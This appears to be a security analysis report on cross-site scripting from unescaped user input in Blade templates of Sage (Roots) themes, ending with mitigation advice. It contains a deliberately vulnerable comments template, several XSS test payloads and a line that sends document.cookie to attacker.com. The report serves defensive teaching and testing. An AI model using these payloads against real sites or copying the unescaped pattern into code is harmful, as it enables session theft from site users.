# Deep Analysis of Attack Tree Path: Unsanitized User Input -> XSS in Sage (Roots)

## 1. Define Objective, Scope, and Methodology

### 1.1 Objective

The primary objective of this deep analysis is to thoroughly investigate the potential for Cross-Site Scripting (XSS) vulnerabilities arising from unsanitized user input within Blade templates in a Sage (Roots) based web application.  We aim to identify specific attack vectors, assess the likelihood and impact of successful exploitation, and propose concrete mitigation strategies.  This analysis will inform development practices and security testing procedures.

### 1.2 Scope

This analysis focuses specifically on the following:

*   **Sage (Roots) Framework:**  We are examining applications built using the Sage starter theme, which heavily relies on Blade templating.
*   **Blade Templating Engine:**  The core of our investigation is how user input is handled and rendered within Blade templates (`.blade.php` files).
*   **Unsanitized User Input:** We are concerned with any scenario where user-provided data (from forms, URL parameters, database queries, etc.) is directly outputted to the HTML without proper sanitization or escaping.
*   **Cross-Site Scripting (XSS):**  The specific vulnerability we are analyzing is XSS, where malicious JavaScript code is injected and executed in the context of a user's browser.  We will consider both stored (persistent) and reflected XSS.
* **Exclusion:** This analysis will not cover other types of vulnerabilities (e.g., SQL injection, CSRF) except where they might indirectly contribute to an XSS attack.  It also does not cover client-side JavaScript vulnerabilities unrelated to server-side rendering in Blade.

### 1.3 Methodology

The analysis will follow these steps:

1.  **Code Review:**  A thorough manual review of Blade template files (`.blade.php`) will be conducted, searching for instances where user input is displayed.  We will pay close attention to the use of Blade's output directives (`{{ }}`, `{!! !!}`).
2.  **Dynamic Analysis (Testing):**  We will perform penetration testing using common XSS payloads to identify vulnerabilities in a running instance of the application.  This will involve submitting malicious input to various forms and observing the application's response.
3.  **Vulnerability Assessment:**  For each identified potential vulnerability, we will assess:
    *   **Likelihood:** How easy is it for an attacker to exploit this vulnerability?  This considers factors like input validation, input filtering, and the context of the output.
    *   **Impact:** What is the potential damage if the vulnerability is exploited?  This includes cookie theft, session hijacking, defacement, phishing, and data breaches.
    *   **Risk Level:**  A combination of likelihood and impact, categorized as High, Medium, or Low.
4.  **Mitigation Recommendations:**  For each identified vulnerability, we will provide specific, actionable recommendations for remediation.  This will include code examples and best practices.
5.  **Documentation:**  All findings, assessments, and recommendations will be documented in this report.

## 2. Deep Analysis of Attack Tree Path: Unsanitized User Input -> XSS

**Attack Tree Path:** High-Risk Path 2: Unsanitized User Input -> XSS -> 1.2.1 Unsanitized User Input in Blade Templates -> 1.2.1.1 Cross-Site Scripting (XSS)

### 2.1. Vulnerability Description (Recap)

An attacker exploits a lack of proper sanitization or escaping of user-provided input within Blade templates.  They inject malicious JavaScript code into an input field (e.g., a comment form, search bar, profile field).  When this input is later displayed to other users (or the same user), the injected script executes within their browser, allowing the attacker to perform actions on behalf of the victim.

### 2.2. Code Review and Vulnerability Identification

Blade provides two primary ways to output data:

*   **`{{ $variable }}` (Escaped Output):** This is the *safe* way to output data.  Blade automatically escapes HTML entities, preventing XSS.  For example, `<script>` becomes `&lt;script&gt;`, rendering it harmless.
*   **`{!! $variable !!}` (Unescaped Output):** This is the *dangerous* way if used with user input.  It outputs the raw, unescaped data.  If `$variable` contains malicious JavaScript, it will be executed.

**Example Vulnerability (Vulnerable Code):**

Let's say we have a comments section where users can post comments.  The following Blade code is vulnerable:

```blade
// resources/views/partials/comments.blade.php

@foreach ($comments as $comment)
    <div class="comment">
        <p><strong>{{ $comment->author }}</strong> said:</p>
        <p>{!! $comment->content !!}</p>  </div>
@endforeach
```

In this example, the `author` is likely safe (assuming it's a simple username), but the `content` is displayed using `{!! !!}`, meaning it's *not* escaped.  An attacker could submit a comment with the following content:

```html
<script>alert('XSS!');</script>
```

Or, more maliciously:

```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>
```

This script would execute in the browser of any user viewing the comments, potentially stealing their cookies.

**Other Potential Vulnerable Areas:**

*   **Search Result Pages:**  If the search query is displayed back to the user without escaping, an attacker could inject XSS through the search term.
*   **User Profile Fields:**  If profile fields (e.g., "About Me") are displayed unescaped, they become XSS vectors.
*   **Error Messages:**  If error messages include user input (e.g., "Invalid input: [user input]"), they can be exploited.
*   **URL Parameters:** Data taken directly from URL parameters and displayed without escaping.
* **Data from database:** Data that was not sanitized before storing in database.

### 2.3. Dynamic Analysis (Testing)

To confirm the vulnerability, we would perform the following tests (using a development or staging environment, *never* production):

1.  **Basic Payload:** Submit the comment: `<script>alert('XSS');</script>`.  If an alert box pops up, the vulnerability is confirmed.
2.  **Cookie Stealing Payload:** Submit a comment with a script designed to send the user's cookies to a server we control.  This demonstrates the potential for session hijacking.
3.  **HTML Injection:** Submit a comment with HTML tags (e.g., `<h1>Heading</h1>`, `<iframe>`).  This tests if the attacker can manipulate the page's structure.
4.  **Event Handlers:**  Test payloads using event handlers like `onload`, `onerror`, `onmouseover`:
    *   `<img src="x" onerror="alert('XSS')">`
    *   `<a href="#" onmouseover="alert('XSS')">Hover me</a>`
5.  **Encoded Payloads:** Try various encodings (HTML entities, URL encoding, JavaScript escapes) to bypass any potential (but insufficient) filtering.  For example:
    *   `&lt;script&gt;alert('XSS');&lt;/script&gt;`
    *   `%3Cscript%3Ealert('XSS')%3C%2Fscript%3E`
    *   `\x3Cscript\x3Ealert('XSS')\x3C\x2Fscript\x3E`

### 2.4. Vulnerability Assessment

*   **Likelihood:** High.  It's relatively easy for an attacker to inject malicious code if unescaped output is used.  The attacker only needs to find an input field that is later displayed using `{!! !!}`.
*   **Impact:** High.  Successful XSS exploitation can lead to:
    *   **Session Hijacking:**  Stealing user cookies allows the attacker to impersonate the user.
    *   **Website Defacement:**  The attacker can modify the content of the page.
    *   **Phishing:**  The attacker can redirect users to fake login pages to steal credentials.
    *   **Data Theft:**  The attacker can potentially access sensitive data displayed on the page.
    *   **Malware Distribution:**  The attacker could use the compromised page to distribute malware.
*   **Risk Level:** High.  Due to the high likelihood and high impact, XSS vulnerabilities in Blade templates are considered high-risk.

### 2.5. Mitigation Recommendations

1.  **Always Use Escaped Output (`{{ }}`) by Default:**  The most important mitigation is to *always* use `{{ $variable }}` for displaying user input unless you have a very specific and well-justified reason to use unescaped output.  In the comments example, change:

    ```blade
    <p>{!! $comment->content !!}</p>
    ```

    to:

    ```blade
    <p>{{ $comment->content }}</p>
    ```

2.  **Use a Dedicated HTML Sanitizer (If Unescaped Output is Necessary):**  If you *must* allow users to input some HTML (e.g., for rich text editing), use a robust HTML sanitization library.  This library will remove dangerous tags and attributes while preserving safe HTML.  Popular PHP sanitizers include:
    *   **HTML Purifier:** A very comprehensive and secure sanitizer.
    *   **DOMPurify (for JavaScript):** If you're sanitizing on the client-side before sending data to the server, DOMPurify is an excellent choice.
    *   **Mews/Purifier:** Laravel package, that is using HTML Purifier.

    Example (using Mews/Purifier):

    ```php
    // In your controller or model
    use Mews\Purifier\Facades\Purifier;

    $cleanContent = Purifier::clean($comment->content);

    // In your Blade template
    <p>{!! $cleanContent !!}</p>
    ```
    **Important:** Configure the sanitizer carefully.  Allow only the specific HTML tags and attributes you need.  A too-permissive configuration can still be vulnerable.

3.  **Input Validation:**  Validate user input *before* it's stored or displayed.  This can help prevent obviously malicious input from being processed.  However, input validation is *not* a substitute for output escaping or sanitization.  Attackers can often bypass validation rules.

4.  **Content Security Policy (CSP):**  Implement a Content Security Policy (CSP) in your HTTP headers.  CSP is a powerful browser security mechanism that can prevent XSS even if a vulnerability exists.  It restricts the sources from which the browser can load resources (scripts, styles, images, etc.).  A well-configured CSP can prevent the execution of inline scripts and scripts from untrusted domains.

    Example CSP header:

    ```
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
    ```

    This CSP allows scripts only from the same origin (`'self'`) and from `https://trusted-cdn.com`.  It would block the execution of inline scripts injected via XSS.

5.  **Regular Security Audits and Penetration Testing:**  Conduct regular security audits and penetration tests to identify and address vulnerabilities.  This should include both automated scanning and manual testing.

6.  **Educate Developers:**  Ensure that all developers working on the project understand the risks of XSS and the importance of proper output escaping and sanitization.  Provide training and code review guidelines.

7. **Sanitize Data on Input and Output:** While output escaping is crucial, sanitizing data *before* storing it in the database can provide an additional layer of defense. This is especially important if the data might be used in contexts other than Blade templates (e.g., API responses).

### 2.6. Conclusion

XSS vulnerabilities in Blade templates are a serious security risk.  By consistently using escaped output (`{{ }}`), employing HTML sanitizers when necessary, implementing CSP, and following secure coding practices, developers can significantly reduce the risk of XSS attacks in Sage (Roots) based applications.  Regular security testing and developer education are also essential components of a robust security posture.
